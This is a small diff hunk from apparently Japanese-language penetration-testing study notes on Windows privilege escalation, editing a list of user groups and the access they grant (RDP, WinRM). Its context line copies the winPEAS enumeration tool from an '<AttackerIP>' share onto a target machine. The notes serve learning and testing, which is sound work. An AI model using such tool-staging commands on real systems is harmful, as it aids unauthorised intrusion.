@@ -76,7 +76,7 @@ cp \\<AttackerIP>\share\winPEASx64.exe .
 - `Helpdesk`：一般ユーザーに比べ何か特権を持っている可能性がある
 - `Remote Desktop/Management`グループ：
 	- `Desktop`：RDP接続でGUIアクセスが可能
-	- `Management`：WinRM（遠隔PowerShell）が可能
+	- `Management`：WinRMが可能
 	- ※`Administrators`グループなら両方可能
 - 補足：[[#管理者のアカウント運用について]]
 
